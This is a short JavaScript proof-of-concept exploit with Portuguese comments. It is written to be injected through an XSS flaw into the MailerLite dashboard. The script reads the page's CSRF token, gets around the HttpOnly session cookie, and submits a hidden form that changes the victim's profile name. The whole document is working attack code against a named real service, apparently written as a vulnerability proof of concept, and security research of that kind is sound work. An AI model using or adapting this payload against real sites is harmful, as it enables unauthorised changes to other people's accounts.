// O script seria injetado em uma página vulnerável a XSS
// O cookie de sessão tem o atributo HttpOnly, por isso não podemos roubá-lo com document.cookie.
// Mas podemos usar a vulnerabilidade de XSS para roubar o token CSRF da página.

// 1. Rouba o token CSRF da página
var xsrfToken = document.querySelector('input[name="_token"]').value;

// 2. Cria um formulário para fazer a requisição POST
var form = document.createElement('form');
form.action = 'https://dashboard.mailerlite.com/user/profile';
form.method = 'POST';

// 3. Adiciona os campos com os dados que o atacante quer alterar
var tokenInput = document.createElement('input');
tokenInput.type = 'hidden';
tokenInput.name = 'XSRF-TOKEN';
tokenInput.value = xsrfToken;
form.appendChild(tokenInput);

var methodInput = document.createElement('input');
methodInput.type = 'hidden';
methodInput.name = '_method';
methodInput.value = 'PUT';
form.appendChild(methodInput);

var nameInput = document.createElement('input');
nameInput.type = 'hidden';
nameInput.name = 'name';
nameInput.value = 'Nome Alterado por Ataque';
form.appendChild(nameInput);

var lastNameInput = document.createElement('input');
lastNameInput.type = 'hidden';
lastNameInput.name = 'last_name';
lastNameInput.value = 'poc1';
form.appendChild(lastNameInput);

// 4. Adiciona o formulário na página e o envia
document.body.appendChild(form);
form.submit();
